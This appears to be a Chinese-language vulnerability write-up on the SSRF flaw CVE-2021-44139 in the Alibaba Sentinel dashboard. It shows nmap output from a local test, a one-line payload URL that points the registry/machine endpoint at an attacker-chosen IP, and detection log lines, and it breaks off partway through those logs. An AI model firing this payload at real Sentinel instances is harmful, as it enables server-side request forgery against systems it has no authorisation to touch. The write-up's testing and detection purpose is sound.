class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-number">8080</span>   <br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span> ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-02-23 10:50 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-title function_">localhost</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>)<br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.00026</span>s <span class="hljs-variable">latency</span>).<br><br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">favicon</span>: <span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Java</span> <span class="hljs-title class_">Framework</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">sentinel_dashboard_cookie</span><span class="hljs-operator">=</span><span class="hljs-variable">BE654F45DE66F950E0710F8070194DEE</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Last</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">22</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Accept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>: <span class="hljs-variable">bytes</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>: <span class="hljs-variable">zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">901</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span> <span class="hljs-variable">html</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span> <span class="hljs-keyword">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;no-js&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Sentinel</span> <span class="hljs-title class_">Dashboard</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;description&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Sentinel </span><br><span class="hljs-string">|     ,Sentinel Dashboard,Admin&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;width=device-width&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/bootstrap.min.css&quot;</span> /<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/font-awesome.min.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./dist/css/app.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-variable">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/static/favicon.ico&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">base</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">body</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ng</span><span class="hljs-operator">-</span><span class="hljs-variable">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sentinelDashboardApp&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ui</span><span class="hljs-operator">-</span><span class="hljs-variable">view</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/jquery.min.js&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">script</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/b</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 </span><br><span class="hljs-string">|     Allow: GET,HEAD,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   RTSPRequest, Socks4, Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 </span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Sentinel Dashboard</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94%I=7%D=2/23%Time=65D807E9%P=arm-apple-darwin23.2.0%r</span><br><span class="hljs-string">SF:(GetRequest,46C,&quot;</span><span class="hljs-variable">HTTP</span>/<span class="hljs-number">1</span>\<span class="hljs-number">.1</span>\<span class="hljs-variable">x20200</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nLast</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>:\<span class="hljs-variable">x20Thu</span>,\<span class="hljs-variable">x2022</span>\<span class="hljs-variable">x</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">20</span>Feb\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2011</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nAccept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>:\<span class="hljs-variable">x20bytes</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Type</span>:\<span class="hljs-variable">x20text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>:\<span class="hljs-variable">x20zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>:\<span class="hljs-variable">x20901</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nDate</span>:\<span class="hljs-variable">x20Fri</span>,\<span class="hljs-variable">x2023</span>\<span class="hljs-variable">x20Feb</span>\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2002</span>:<span class="hljs-number">50</span>:<span class="hljs-number">1</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">7</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nConnection</span>:\<span class="hljs-variable">x20close</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span>\<span class="hljs-variable">x20html</span><span class="hljs-operator">&gt;</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span>\<span class="hljs-variable">x20cl</span><br><span class="hljs-variable">SF</span>:ass<span class="hljs-operator">=</span>\<span class="hljs-string">&quot;no-js<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>charset=<span class="hljs-char escape_">\&quot;</span>utf-8<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&lt;title&gt;Sentinel<span class="hljs-char escape_">\x20</span>Dashboard&lt;/title&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>descripti</span><br><span class="hljs-string">SF:on<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>content=<span class="hljs-char escape_">\&quot;</span>Sentinel<span class="hljs-char escape_">\x20</span>\xe6\x8e\xa7\xe5<span class="hljs-char escape_">\x88</span>\xb6\xe5\x8f\xb0,Sent</span><br><span class="hljs-string">SF:inel<span class="hljs-char escape_">\x20</span>Dashboard,Admin<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>viewport<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>conte</span><br><span class="hljs-string">SF:nt=<span class="hljs-char escape_">\&quot;</span>width=device-width<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>hr</span><br><span class="hljs-string">SF:ef=<span class="hljs-char escape_">\&quot;</span>\./lib/css/bootstrap\.min\.css<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>/&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>sty</span><br><span class="hljs-string">SF:lesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./lib/css/font-awesome\.min\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./dist/css/app\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>image/x-icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>/static/favicon\.ic</span><br><span class="hljs-string">SF:o<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;base<span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span>&lt;/head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;body&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div\x</span><br><span class="hljs-string">SF:20ng-app=<span class="hljs-char escape_">\&quot;</span>sentinelDashboardApp<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div<span class="hljs-char escape_">\x20</span>ui-view&gt;&lt;/d</span><br><span class="hljs-string">SF:iv&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;/div&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/jquery\.min\.js</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/b&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">75</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">SF:HTTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Allow:<span class="hljs-char escape_">\x20</span>GET,HEAD,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:\x</span><br><span class="hljs-string">SF:200<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connect</span><br><span class="hljs-string">SF:ion:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>clos</span><br><span class="hljs-string">SF:e<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">B6</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>sentinel_dashboard_cookie=BE654F45DE66F950E0710F8070194DEE;<span class="hljs-char escape_">\x20</span>Path</span><br><span class="hljs-string">SF:=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb\x</span><br><span class="hljs-string">SF:202024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">49</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:1</span><br><span class="hljs-string">SF:7<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>40</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Conne</span><br><span class="hljs-string">SF:ction:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11.61</span> <span class="hljs-variable">seconds</span><br>➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <br><br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload:</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="攻击排查"><a href="#攻击排查" class="headerlink" title="攻击排查"></a>攻击排查</h2><h3 id="服务日志"><a href="#服务日志" class="headerlink" title="服务日志"></a>服务日志</h3><p>攻击后服务会周期性访问payload中指定的ip和port组成的服务，可查询包含“Failed to fetch metric from”字符串的日志</p><p>测试过程中为 10.235.151.11:0</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">12.108</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[O dispatcher 17]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654313000&amp;endTime=1708654319000&amp;refetch=false&gt;: socket timeout</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">23.873</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span 